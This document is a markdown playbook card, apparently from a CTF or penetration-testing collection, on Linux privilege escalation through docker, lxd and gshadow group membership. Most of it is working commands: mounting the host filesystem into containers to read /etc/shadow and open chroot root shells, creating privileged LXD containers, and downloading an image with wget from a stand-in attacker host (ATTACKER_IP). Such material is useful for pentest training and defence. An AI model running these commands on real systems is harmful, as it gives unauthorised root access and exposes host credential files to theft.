# Group Membership Privesc — Docker / LXD / gshadow

## When this applies

- Linux foothold; user is in `docker`, `lxd`, `disk`, `adm`, `shadow`, or `video` group, OR `/etc/gshadow` is readable and shows empty group passwords.
- Goal: leverage group membership for effective root access.

## Technique

Linux groups grant specific privileges. `docker` and `lxd` are effectively root. `gshadow` empty passwords let any user `newgrp` into a privileged group.

## Steps

### gshadow/newgrp Privilege Escalation

When `/etc/gshadow` has a group entry with an **empty password field** (not `!` or `*`), `newgrp <group>` allows ANY user to join that group — even if not listed as a member in `/etc/group`.

**Detection:**

```bash
cat /etc/gshadow 2>/dev/null        # Readable? Check for empty 2nd field
getent group docker                  # Who's in docker group?
# gshadow format: group:password:admins:members
# Empty password field = no password required for newgrp
```

**Exploitation:**

```bash
# Switch primary group (works even if not a member when gshadow has no password)
newgrp docker
# Verify
id   # Should show gid=docker
# Now use docker to get root
docker run --rm -v /:/host --entrypoint cat <available_image> /host/root/root.txt
docker run --rm -v /:/host --entrypoint /bin/sh -it <available_image> -c 'chroot /host bash'
```

**Key groups to check:** docker, lxd, disk, adm, shadow, video, root

### Docker Group Abuse

Users in the `docker` group can interact with the Docker daemon and effectively gain root:

```bash
# List available images (no internet pull needed)
docker images
# Mount host filesystem and read/write as root
docker run --rm -v /:/host --entrypoint cat <image> /host/etc/shadow
# Get interactive root shell via chroot
docker run --rm -v /:/host -it --entrypoint /bin/sh <image> -c 'chroot /host bash'
# If --entrypoint not supported, use --privileged
docker run --rm --privileged -v /:/host -it <image> /bin/sh
```

**Note:** Use images already on the system (`docker images`) — target may have no internet access.

### LXD Group Abuse

Users in the `lxd` group can create privileged containers that mount the host filesystem:

```bash
# If lxd has images available
lxc image list
# If no images: host Alpine LXD image on attacker HTTP server, download on target
# Build image: mkdir rootfs && tar xzf alpine-minirootfs.tar.gz -C rootfs/ && create metadata.yaml && tar czf alpine.tar.gz metadata.yaml rootfs/
wget -O /tmp/alpine.tar.gz http://ATTACKER_IP:PORT/alpine.tar.gz
lxc image import /tmp/alpine.tar.gz --alias myalpine
# Create privileged container with host filesystem
lxc init myalpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
# Read/write any file on host
lxc exec privesc -- cat /mnt/root/root/root.txt
lxc exec privesc -- /bin/sh  # Interactive root shell on host filesystem
```

**Key:** Target often has no internet — build minimal Alpine LXD image locally (metadata.yaml + Alpine minirootfs tarball), serve via HTTP, and `wget` on target.

## Verifying success

- `docker run -v /:/host ... cat /host/etc/shadow` returns the host shadow file.
- `lxc exec privesc -- cat /mnt/root/root/root.txt` returns root's flag.

## Common pitfalls

- No internet on target → must pre-stage Alpine LXD image, serve over HTTP from attacker.
- `newgrp` on empty-password gshadow entries opens shells with the new GID — use that shell for the privileged action.

## Tools

- docker / lxc / lxd
- newgrp
- getent
